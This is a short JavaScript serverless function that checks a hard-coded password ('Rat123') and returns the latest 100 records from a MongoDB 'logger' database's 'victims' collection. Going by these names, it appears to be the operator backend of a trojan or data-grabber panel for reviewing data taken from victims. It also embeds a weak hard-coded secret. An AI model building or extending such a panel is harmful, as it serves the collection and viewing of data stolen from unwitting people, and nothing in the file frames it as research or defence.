// functions/get-data.js
const MongoClient = require('mongodb').MongoClient;

const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'logger';
const COLLECTION = 'victims';

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { password } = JSON.parse(event.body);
        
        if (password !== 'Rat123') {
            return {
                statusCode: 401,
                body: JSON.stringify({ success: false, message: 'Unauthorized' })
            };
        }

        const client = new MongoClient(MONGODB_URI);
        await client.connect();
        const db = client.db(DB_NAME);
        const collection = db.collection(COLLECTION);

        const data = await collection.find({})
            .sort({ receivedAt: -1 })
            .limit(100)
            .toArray();

        await client.close();

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                data: data 
            })
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, error: error.message })
        };
    }
};